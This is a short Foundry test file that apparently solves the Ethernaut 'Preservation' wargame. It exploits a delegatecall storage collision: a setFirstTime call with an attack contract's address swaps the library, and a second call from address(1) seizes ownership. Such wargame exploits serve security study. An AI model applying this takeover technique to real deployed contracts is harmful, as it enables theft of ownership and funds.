// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "./Preservation.sol";
import "./PreservationAttack.sol";

contract PreservationTest is Test {
    Preservation preservation;
    PreservationAttack preservationAttack;
    LibraryContract lib1;
    LibraryContract lib2;

    function setUp() public {
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        preservation = new Preservation(address(lib1), address(lib2));
        preservationAttack = new PreservationAttack();
    }

    function testPreservation() public {
        preservation.setFirstTime(uint160(address(preservationAttack)));

        vm.prank(address(1));
        preservation.setFirstTime(0);

        require(preservation.owner() == address(1), "wrong owner");
    }
}
